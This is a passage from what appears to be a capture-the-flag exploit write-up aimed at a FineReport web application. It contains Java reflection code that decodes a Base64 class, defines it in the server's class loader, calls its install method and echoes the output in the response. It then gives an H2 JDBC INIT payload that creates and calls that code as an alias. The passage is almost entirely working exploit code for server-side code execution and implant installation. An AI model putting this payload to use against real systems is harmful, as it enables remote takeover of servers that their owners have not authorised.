                if (type == Long.TYPE && values[index] instanceof Long) continue;
                return false;
            }
            if (!type.isInstance(values[index])) {
                return false;
            }
        }
        return true;
    }
}
```

```java
void e() throws Exception {
    ClassLoader cl = Thread.currentThread().getContextClassLoader();
    Object d = Class.forName("sun.misc.BASE64Decoder").newInstance();
    byte[] b = (byte[]) d.getClass().getMethod("decodeBuffer", String.class)
        .invoke(d, "<Y.class Base64>");
    Class c;
    try {
        c = Class.forName("Y", false, cl);
    } catch (ClassNotFoundException x) {
        java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(
            "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        m.setAccessible(true);
        c = (Class) m.invoke(cl, b, Integer.valueOf(0), Integer.valueOf(b.length));
    }
    String s = String.valueOf(c.getMethod("install").invoke(null));
    Object a = cl.loadClass(
            "com.fr.third.springframework.web.context.request.RequestContextHolder")
        .getMethod("getRequestAttributes").invoke(null);
    Object r = a.getClass().getMethod("getResponse").invoke(a);
    r.getClass().getMethod("setHeader", String.class, String.class)
        .invoke(r, "X-Out", s);
    java.io.OutputStream o = (java.io.OutputStream) r.getClass()
        .getMethod("getOutputStream").invoke(r);
    o.write(s.getBytes("UTF-8"));
    o.flush();
}
```

```text
jdbc:h2:mem:m3;INIT=CREATE ALIAS E AS 'void e() throws Exception {ClassLoader cl=Thread.currentThread().getContextClassLoader()\;Object d=Class.forName("sun.misc.BASE64Decoder").newInstance()\;byte[] b=(byte[])d.getClass().getMethod("decodeBuffer",String.class).invoke(d,"<Y.class Base64>")\;Class c\;try{c=Class.forName("Y",false,cl)\;}catch(ClassNotFoundException x){java.lang.reflect.Method m=ClassLoader.class.getDeclaredMethod("defineClass",byte[].class,Integer.TYPE,Integer.TYPE)\;m.setAccessible(true)\;c=(Class)m.invoke(cl,b,Integer.valueOf(0),Integer.valueOf(b.length))\;}String s=String.valueOf(c.getMethod("install").invoke(null))\;Object a=cl.loadClass("com.fr.third.springframework.web.context.request.RequestContextHolder").getMethod("getRequestAttributes").invoke(null)\;Object r=a.getClass().getMethod("getResponse").invoke(a)\;r.getClass().getMethod("setHeader",String.class,String.class).invoke(r,"X-Out",s)\;java.io.OutputStream o=(java.io.OutputStream)r.getClass().getMethod("getOutputStream").invoke(r)\;o.write(s.getBytes("UTF-8"))\;o.flush()\;}'\;CALL E()
```

 `/webroot/decision/login` 连接，200 分到手☝️